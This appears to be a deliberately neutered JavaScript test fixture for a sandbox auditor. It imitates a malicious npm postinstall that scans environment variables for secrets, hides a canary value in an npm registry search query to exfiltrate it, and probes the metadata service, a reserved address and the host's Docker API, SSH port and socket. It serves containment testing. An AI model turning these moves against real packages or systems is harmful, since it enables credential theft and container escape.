// TEST FIXTURE — HOSTILE BY DESIGN, but deliberately neutered.
//
// This stands in for a supply-chain-compromised package whose postinstall misbehaves. It runs
// a short "attack lab": the moves real install-time malware makes, each one bounded and aimed
// so it can't do damage anywhere, so a live VibeAudit run can show which control stops each.
//  - It never sends a real secret: the only value it sends is VIBEAUDIT_CANARY, a fake that
//    the VibeAudit sandbox plants. Outside the sandbox that variable doesn't exist and the
//    step is skipped.
//  - Network targets are a reserved never-routable address (TEST-NET-1), the link-local cloud
//    metadata address, and the container's own gateway. One attempt each, short timeouts.
//  - No fork bomb, no memory bomb, no file writes.
//
// NEVER run `npm install` on this package outside the VibeAudit sandbox.
const fs = require("fs");
const https = require("https");
const net = require("net");

const log = (step, result) => console.log(`[demo-malicious] ${step}: ${result}`);

/** One TCP connection attempt; resolves with how it ended. */
function tryConnect(host, port) {
  return new Promise((resolve) => {
    const s = net.connect({ host, port, timeout: 4000 });
    const done = (r) => {
      s.destroy();
      resolve(r);
    };
    s.on("connect", () => done("CONNECTED (containment failed)"));
    s.on("timeout", () => done("blocked (timeout)"));
    s.on("error", (e) => done(`blocked (${e.code || e.message})`));
  });
}

/** Default gateway of this container, from /proc/net/route (the host side of the bridge). */
function gateway() {
  try {
    for (const line of fs.readFileSync("/proc/net/route", "utf8").split("\n").slice(1)) {
      const f = line.trim().split(/\s+/);
      if (f[1] === "00000000" && f[2] && f[2] !== "00000000") {
        const hex = f[2];
        // Little-endian hex: "0100A8C0" is 192.168.0.1.
        return [3, 2, 1, 0].map((i) => parseInt(hex.slice(i * 2, i * 2 + 2), 16)).join(".");
      }
    }
  } catch {}
  return null;
}

async function main() {
  // 1. Steal credentials from the environment. Only COUNTED here: the sandbox should hand over
  //    canary stubs, never real values.
  const secretish = Object.keys(process.env).filter((k) => /KEY|TOKEN|SECRET|PASSWORD|DATABASE_URL/i.test(k));
  log("env-scan", `${secretish.length} secret-looking vars visible`);

  // 2. Exfiltrate through a host the install is ALLOWED to reach (the npm registry), hiding
  //    the value in a search query. Only the sandbox's own fake canary, only inside VibeAudit.
  const canary = process.env.VIBEAUDIT_CANARY;
  if (canary) {
    const r = await new Promise((resolve) => {
      const req = https.get(`https://registry.npmjs.org/-/v1/search?size=1&text=${encodeURIComponent(canary)}`, { timeout: 8000 }, (res) => {
        res.resume();
        resolve(`HTTP ${res.statusCode}${res.statusCode === 403 ? " (blocked)" : ""}`);
      });
      req.on("timeout", () => {
        req.destroy();
        resolve("blocked (timeout)");
      });
      req.on("error", (e) => resolve(`blocked (${e.code || e.message})`));
    });
    log("exfil-via-registry", r);
  } else {
    log("exfil-via-registry", "skipped (not inside VibeAudit)");
  }

  // 3. Phone home directly, skipping the proxy (TEST-NET-1: reserved, never routable).
  log("direct-egress", await tryConnect("192.0.2.1", 443));

  // 4. Steal cloud credentials from the instance metadata service.
  log("cloud-metadata", await tryConnect("169.254.169.254", 80));

  // 5. Break out to the machine running the sandbox: its Docker API and SSH.
  const gw = gateway();
  if (gw) {
    log("host-docker-api", await tryConnect(gw, 2375));
    log("host-ssh", await tryConnect(gw, 22));
  } else {
    log("host", "no gateway found");
  }

  // 6. Look for the Docker socket (a mounted socket = full control of the host).
  log("docker-socket", fs.existsSync("/var/run/docker.sock") ? "PRESENT (containment failed)" : "absent");

  // postinstall must exit so the (benign) app can still be built and booted for the audit.
  log("done", "postinstall complete");
}

main();
